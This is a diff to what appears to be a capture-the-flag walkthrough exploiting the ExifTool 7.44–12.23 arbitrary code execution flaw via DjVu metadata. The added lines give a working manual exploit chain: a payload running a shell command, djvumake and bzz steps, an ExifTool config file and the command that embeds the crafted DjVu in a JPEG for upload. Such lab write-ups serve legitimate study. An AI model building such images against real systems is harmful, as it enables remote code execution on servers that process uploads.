@@ -185,11 +185,9 @@ Shellcodes: No Results
 
 <br />
 
-`Exiftool` versions from 7.44 to `12.23` are `vulnerable` to an Arbitrary Code Execution.
+`Exiftool` versions from `7.44` to `12.23` are `vulnerable` to an Arbitrary Code Execution.
 
 We don't know what `version` the `exiftool` runs from the `website`, but it's the `only` vulnerability it seems to have, so let's `test` it.
-
-<br />
 
 First of all, we `bring` the `script` and `analyze` its code:
 
@@ -345,12 +343,12 @@ Basically, what this exploit does is `generate` a malicious `DjVu` file with bzz
 
 Now that we `know` more or less what it `does`, let's exploit it `manually`!
 
-1.- `Create` the payload:
+1.- `Create` a file named `"payload"` with this `content`:
 
 <br />
 
 ```bash
-echo '(metadata "\c${system('whoami')};")' > payload.txt
+(metadata "\c${system('id')};")
 ```
 
 <br />
@@ -370,22 +368,45 @@ bzz payload.txt payload.bzz
 <br />
 
 ```bash
-
+djvumake exploit.djvu INFO='1,1' BGjp=/dev/null ANTz=payload.bzz
 ```
 
 <br />
 
-4.- `Inyect` the malicious `file` into the `metadata` of a random `image`:
+4.- Create a `configfile` with the following `content` to `convert` DjVu file to a `jpeg`:
 
 <br />
 
 ```bash
-
+%Image::ExifTool::UserDefined = (
+    # All EXIF tags are added to the Main table, and WriteGroup is used to
+    # specify where the tag is written (default is ExifIFD if not specified):
+    'Image::ExifTool::Exif::Main' => {
+        # Example 1.  EXIF:NewEXIFTag
+        0xc51b => {
+            Name => 'HasselbladExif',
+            Writable => 'string',
+            WriteGroup => 'IFD0',
+        },
+        # add more user-defined EXIF tags here...
+    },
+);
+1; #end%
 ```
 
 <br />
 
-5.- Upload the image to the website:
+5.- `Inyect` the malicious `file` into the `metadata` of a random `image`:
+
+<br />
+
+```bash
+exiftool -config configfile '-HasselbladExif<=exploit.djvu' hacker.jpg
+```
+
+<br />
+
+5.- `Upload` the `image` to the website:
 
 <br />
 
